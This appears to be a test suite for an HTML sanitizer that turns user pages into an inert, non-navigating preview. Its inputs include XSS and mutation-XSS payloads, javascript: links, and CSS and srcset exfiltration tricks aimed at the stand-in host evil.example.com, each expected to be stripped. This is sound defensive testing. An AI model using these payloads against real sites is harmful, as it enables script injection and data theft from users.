import { describe, expect, it } from "bun:test";
import type { WindowLike } from "dompurify";
import { JSDOM } from "jsdom";
import { buildInertPage, srcsetUrls } from "@/lib/inertPage";

const dom = new JSDOM("<!doctype html><html><body></body></html>");
const win = dom.window as unknown as WindowLike;
const desktop = { width: 1440, height: 900 };

/** The page as the shadow root would hold it, serialized for assertions. */
const render = (html: string) => {
  const { content, linksIconFont } = buildInertPage(html, desktop, win);
  const holder = dom.window.document.createElement("div");
  holder.append(content);
  return { markup: holder.innerHTML, css: holder.querySelector("style")?.textContent ?? "", linksIconFont };
};
const body = (html: string) => {
  const { content } = buildInertPage(html, desktop, win);
  const holder = dom.window.document.createElement("div");
  holder.append(content);
  return holder.querySelector("[data-wirely-body]")?.innerHTML ?? "";
};

describe("buildInertPage", () => {
  it("strips event handlers from the classic XSS payloads", () => {
    expect(body('<img src="https://images.unsplash.com/a" onerror="alert(1)">')).toBe(
      '<img src="https://images.unsplash.com/a">',
    );
    expect(body('<svg onload="alert(1)"><circle r="4"></circle></svg>')).toBe(
      '<svg><circle r="4"></circle></svg>',
    );
    expect(body('<div onclick="alert(1)" onmouseover="alert(2)">Hi</div>')).toBe("<div>Hi</div>");
    expect(body('<body onload="alert(1)"><p>x</p></body>')).toBe("<p>x</p>");
  });

  it("removes links, so an inert frame can never navigate", () => {
    expect(body('<a href="javascript:alert(1)" class="btn">Go</a>')).toBe('<a class="btn">Go</a>');
    expect(body('<a href="https://example.com" target="_top">Go</a>')).toBe("<a>Go</a>");
    expect(body('<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>')).toBe(
      "<svg><a><text>x</text></a></svg>",
    );
  });

  it("removes scripts, frames, plugins, forms, and controls with their contents", () => {
    const output = body(`
      <script>alert(1)</script>
      <iframe srcdoc="<script>alert(1)</script>"></iframe>
      <object data="https://evil.example.com/x.swf"></object>
      <embed src="https://evil.example.com/x.swf">
      <form action="https://evil.example.com"><input name="q"></form>
      <button formaction="https://evil.example.com">Buy</button>
      <select><option>One</option></select>
      <textarea>notes</textarea>
      <base href="https://evil.example.com/">
      <meta http-equiv="refresh" content="0;url=https://evil.example.com">
      <link rel="stylesheet" href="https://evil.example.com/x.css">
      <p>kept</p>`);
    expect(output.replace(/\s+/g, "")).toBe("<p>kept</p>");
  });

  it("drops noscript with its contents, and the mutation payloads stay text", () => {
    expect(body('<p>a</p><noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>')).toBe(
      "<p>a</p>",
    );
    // Nothing is parsed twice, so markup inside an attribute never becomes an element.
    const { content } = buildInertPage(
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>' +
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
      desktop,
      win,
    );
    expect(content.querySelectorAll("img, [onerror]").length).toBe(0);
  });

  it("removes SVG script vectors and keeps references into the page", () => {
    expect(body('<svg><foreignObject><div onclick="alert(1)">x</div></foreignObject></svg>')).toBe("<svg></svg>");
    expect(body('<svg><script href="https://evil.example.com/x.js"></script></svg>')).toBe("<svg></svg>");
    expect(body('<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>')).toBe(
      "<svg></svg>",
    );
    expect(body('<svg><use href="https://evil.example.com/s.svg#a"></use><use href="#a"></use></svg>')).toBe(
      '<svg><use></use><use href="#a"></use></svg>',
    );
    expect(body('<svg><image href="https://evil.example.com/x.png"></image></svg>')).toBe("<svg><image></image></svg>");
  });

  it("keeps only allowlisted image sources", () => {
    expect(body('<img src="https://evil.example.com/pixel.gif" alt="a">')).toBe('<img alt="a">');
    expect(body('<img src="data:text/html,<script>alert(1)</script>">')).toBe("<img>");
    expect(body('<img src="data:image/png;base64,AAAA">')).toBe('<img src="data:image/png;base64,AAAA">');
    expect(body('<img srcset="https://images.unsplash.com/a 1x, https://evil.example.com/b 2x">')).toBe("<img>");
    // A browser reads this as one relative URL, a GET to /api/x on the editor.
    expect(
      body('<img srcset="/api/assets/0f8fad5b-d9cb-469f-a165-70867728950e,data:image/../../../api/x">'),
    ).toBe("<img>");
    expect(body('<img srcset="https://images.unsplash.com\u00A0@evil.example/x.png 1x">')).toBe("<img>");
    expect(body('<img srcset="https://images.unsplash.com/a 1x,https://images.unsplash.com/b 2x">')).toBe(
      '<img srcset="https://images.unsplash.com/a 1x,https://images.unsplash.com/b 2x">',
    );
    expect(body('<table background="https://evil.example.com/x.png"><tbody><tr><td>x</td></tr></tbody></table>')).toBe(
      "<table><tbody><tr><td>x</td></tr></tbody></table>",
    );
  });

  it("drops CSS that would load from elsewhere, in style blocks, style attributes, and SVG paint", () => {
    const { markup, css } = render(`
      <style>input[value^=a]{background:url(https://evil.example.com/a)}@import "https://evil.example.com/x.css";</style>
      <div style="position:fixed;inset:0;z-index:99999;background:url(https://evil.example.com/x)">overlay</div>
      <svg><rect fill="url(https://evil.example.com/p.svg#g)"></rect><rect fill="url(#g)"></rect></svg>`);
    expect(markup.slice(markup.indexOf("<div data-wirely-frame"))).not.toContain("evil.example.com");
    expect(css).toContain('input[value^=a]{background: none }@wirely-dropped "https://evil.example.com/x.css";');
    // Position stays: the frame contains fixed content and clips it.
    expect(markup).toContain('style="position:fixed;inset:0;z-index:99999;background: none"');
    expect(markup).toContain('<rect fill="none"></rect><rect fill="url(&quot;#g&quot;)"></rect>');
  });

  it("puts the page's html and body attributes on its wrappers, without handlers", () => {
    const { markup } = render(
      '<html class="dark" lang="en" onclick="alert(1)"><body class="bg-black" style="color:white" onload="alert(1)" background="https://evil.example.com/x.png"><p>x</p></body></html>',
    );
    expect(markup).toContain('<div data-wirely-frame=""><div class="dark" lang="en" data-wirely-html="">');
    expect(markup).toContain('<div class="bg-black" style="color:white" data-wirely-body=""><p>x</p></div>');
  });

  it("styles the page with its compiled CSS and ignores Tailwind source blocks", () => {
    const { css } = render(`<html><head>
      <style type="text/tailwindcss">@theme { --color-brand: red; }</style>
      <style data-wirely-tailwind>.text-brand{color:red}body{margin:0}</style>
      </head><body><p class="text-brand">x</p></body></html>`);
    expect(css).toContain(".text-brand{color:red}[data-wirely-body]{margin:0}");
    expect(css).not.toContain("@theme");
  });

  it("keeps the node ids the editor picks elements by", () => {
    expect(body('<section data-wirely-id="a1"><h1 data-wirely-id="b2" data-wirely-cursor="">Hi</h1></section>')).toBe(
      '<section data-wirely-id="a1"><h1 data-wirely-id="b2" data-wirely-cursor="">Hi</h1></section>',
    );
  });

  it("allows only the exact icon stylesheet the prompts emit, checked by integrity", () => {
    const pinned = render(`<head>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
      </head><body><i class="bi bi-star"></i></body>`);
    expect(pinned.linksIconFont).toBe(true);
    expect(pinned.markup).toContain(
      '<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" integrity="sha384-XGjxtQfXaH2tnPFa9x+ruJTuLE3Aa6LhHSWRr1XeTyhezb4abCG4ccI5AkVDxqC+"',
    );
    expect(pinned.markup).toContain('crossorigin="anonymous"');
    const other = render(`<head>
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.4/font/bootstrap-icons.min.css">
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/evil@1/x.css">
      </head><body></body>`);
    expect(other.linksIconFont).toBe(false);
    expect(other.markup).not.toContain("<link");
  });

  it("renders a vector page's SVG root", () => {
    expect(
      body('<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300"><g id="shape"><path d="M0 0C10 10 20 20 30 30Z" fill="#f00"></path></g></svg>'),
    ).toBe(
      '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300"><g id="shape"><path d="M0 0C10 10 20 20 30 30Z" fill="#f00"></path></g></svg>',
    );
  });
});

describe("srcsetUrls", () => {
  it("reads candidate URLs the way a browser does", () => {
    expect(srcsetUrls("a.png 1x, b.png 2x")).toEqual(["a.png", "b.png"]);
    expect(srcsetUrls("a.png,b.png")).toEqual(["a.png,b.png"]);
    expect(srcsetUrls("a.png, b.png,")).toEqual(["a.png", "b.png"]);
    expect(srcsetUrls("data:image/png;base64,AAAA 1x")).toEqual(["data:image/png;base64,AAAA"]);
    // A no-break space is part of the URL, where it turns the host into userinfo.
    expect(srcsetUrls("https://images.unsplash.com\u00A0@evil.example/x.png 1x")).toEqual([
      "https://images.unsplash.com\u00A0@evil.example/x.png",
    ]);
  });
});
